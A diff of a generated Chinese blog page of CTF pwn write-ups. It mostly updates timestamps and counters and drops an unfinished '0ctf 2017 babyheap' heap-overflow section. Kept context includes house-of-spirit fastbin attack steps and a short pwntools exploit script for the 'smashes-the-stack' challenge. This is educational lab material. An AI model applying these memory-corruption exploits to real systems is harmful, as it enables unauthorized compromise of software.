@@ -125,7 +125,7 @@
 <meta property="og:image" content="http://p6cwaqxnz.bkt.clouddn.com/oreo-fake-chunk.png?imageView2/2/w/400">
 <meta property="og:image" content="http://p6cwaqxnz.bkt.clouddn.com/oreo-notice.png?imageView2/2/w/400">
 <meta property="og:image" content="http://p6cwaqxnz.bkt.clouddn.com/oreo-yeah.png">
-<meta property="og:updated_time" content="2018-09-21T12:22:15.853Z">
+<meta property="og:updated_time" content="2018-09-25T03:10:05.087Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CTF | 201809-writeups">
 <meta name="twitter:description" content="记录">
@@ -396,7 +396,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-09-21 20:22:15" itemprop="dateModified" datetime="2018-09-21T20:22:15+08:00">2018-09-21</time>
+                <time title="Modified: 2018-09-25 11:10:05" itemprop="dateModified" datetime="2018-09-25T11:10:05+08:00">2018-09-25</time>
               
             
           </span>
@@ -446,7 +446,7 @@
                 
                   <span class="post-meta-item-text">Symbols count in article: </span>
                 
-                <span title="Symbols count in article">13k</span>
+                <span title="Symbols count in article">12k</span>
               
 
               
@@ -596,10 +596,6 @@
 <p>（2）覆盖堆指针指向上一步伪造的堆块。(覆盖哪里的堆指针)</p>
 <p>（3）释放堆块，将伪造的堆块释放入fastbin的单链表里面。</p>
 <p>（4）申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的。<br>参考链接：<br><a href="https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717" target="_blank" rel="external">https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717</a><br><a href="https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/" target="_blank" rel="external">https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/</a></p>
-<h3 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf 2017 babyheap"></a>0ctf 2017 babyheap</h3><p>算是很经典的一道题了吧<br>好好理一遍：<br>先分析一下程序<br>保护全开,怎么利用呢…<br><strong>allocate</strong>:<br>最大0x1000<br>chunk 包含三个字段：size,inuse,ptr<br>head 是chunk* 类型。<br>calloc 分配会把内存都置为0，与malloc不同。</p>
-<p><strong>fill</strong><br>没有设置字符串结尾，而且长度并不是之前 chunk 分配时指定的长度，是自己指定的，所以这里就出现了任意堆溢出的情形。可以用来泄露libc地址，以及构造fake chunk</p>
-<p><strong>show</strong><br>输出对应chunk的内容</p>
-<p><strong>利用思路</strong> </p>
 <h3 id="inndy-smashes-the-stack"><a href="#inndy-smashes-the-stack" class="headerlink" title="inndy smashes-the-stack"></a>inndy smashes-the-stack</h3><p>签到题<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">sh = process(<span class="string">"./smash-the-stack"</span>)</div><div class="line"></div><div class="line">buf_addr = p32(<span class="number">0x804A060</span>)</div><div class="line">sh.sendline(buf_addr*<span class="number">0x50</span>)</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure></p>
 <h3 id="stack-pivoting-b0verfl0w"><a href="#stack-pivoting-b0verfl0w" class="headerlink" title="stack pivoting  b0verfl0w"></a>stack pivoting  b0verfl0w</h3><p>来复习一下 <code>stach pivoting</code>反正所有东西对我来说学跟没说过一个样，都忘了…<br>劫持指针指向攻击者能控制的内存区，之后通过ROP利用<br>常见的情况</p>
 <ol>
@@ -729,7 +725,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">61</span>
+                    <span class="site-state-item-count">62</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -864,7 +860,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#readme-revenge"><span class="nav-number">1.</span> <span class="nav-text">readme_revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fortify-fail函数"><span class="nav-number">1.1.</span> <span class="nav-text">__fortify_fail函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-guestbook"><span class="nav-number">2.</span> <span class="nav-text">jarvisoj guestbook</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-smashes"><span class="nav-number">3.</span> <span class="nav-text">jarvisoj smashes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-test-your-memory"><span class="nav-number">4.</span> <span class="nav-text">jarvisoj test your memory</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3-x64"><span class="nav-number">5.</span> <span class="nav-text">level3 x64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level5"><span class="nav-number">6.</span> <span class="nav-text">level5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level4"><span class="nav-number">7.</span> <span class="nav-text">level4</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#借助dynELF实现无libc的漏洞利用"><span class="nav-number">7.1.</span> <span class="nav-text">借助dynELF实现无libc的漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarivsoj-level6"><span class="nav-number">8.</span> <span class="nav-text">jarivsoj level6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#guestbook-2"><span class="nav-number">9.</span> <span class="nav-text">guestbook 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-attack-oreo"><span class="nav-number">10.</span> <span class="nav-text">fastbin attack oreo</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#house-of-spirit"><span class="nav-number">10.1.</span> <span class="nav-text">house of spirit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0ctf-2017-babyheap"><span class="nav-number">11.</span> <span class="nav-text">0ctf 2017 babyheap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#inndy-smashes-the-stack"><span class="nav-number">12.</span> <span class="nav-text">inndy smashes-the-stack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack-pivoting-b0verfl0w"><span class="nav-number">13.</span> <span class="nav-text">stack pivoting  b0verfl0w</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IO-FILE"><span class="nav-number">14.</span> <span class="nav-text">IO FILE</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#readme-revenge"><span class="nav-number">1.</span> <span class="nav-text">readme_revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fortify-fail函数"><span class="nav-number">1.1.</span> <span class="nav-text">__fortify_fail函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-guestbook"><span class="nav-number">2.</span> <span class="nav-text">jarvisoj guestbook</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-smashes"><span class="nav-number">3.</span> <span class="nav-text">jarvisoj smashes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-test-your-memory"><span class="nav-number">4.</span> <span class="nav-text">jarvisoj test your memory</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3-x64"><span class="nav-number">5.</span> <span class="nav-text">level3 x64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level5"><span class="nav-number">6.</span> <span class="nav-text">level5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level4"><span class="nav-number">7.</span> <span class="nav-text">level4</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#借助dynELF实现无libc的漏洞利用"><span class="nav-number">7.1.</span> <span class="nav-text">借助dynELF实现无libc的漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarivsoj-level6"><span class="nav-number">8.</span> <span class="nav-text">jarivsoj level6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#guestbook-2"><span class="nav-number">9.</span> <span class="nav-text">guestbook 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-attack-oreo"><span class="nav-number">10.</span> <span class="nav-text">fastbin attack oreo</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#house-of-spirit"><span class="nav-number">10.1.</span> <span class="nav-text">house of spirit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#inndy-smashes-the-stack"><span class="nav-number">11.</span> <span class="nav-text">inndy smashes-the-stack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack-pivoting-b0verfl0w"><span class="nav-number">12.</span> <span class="nav-text">stack pivoting  b0verfl0w</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IO-FILE"><span class="nav-number">13.</span> <span class="nav-text">IO FILE</span></a></li></ol></div>
             
 
           </div>
@@ -898,7 +894,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="Symbols count total">92k</span>
+    <span title="Symbols count total">106k</span>
   
 
   
@@ -907,7 +903,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="Reading time total">1:23</span>
+    <span title="Reading time total">1:36</span>
   
 </div>
 
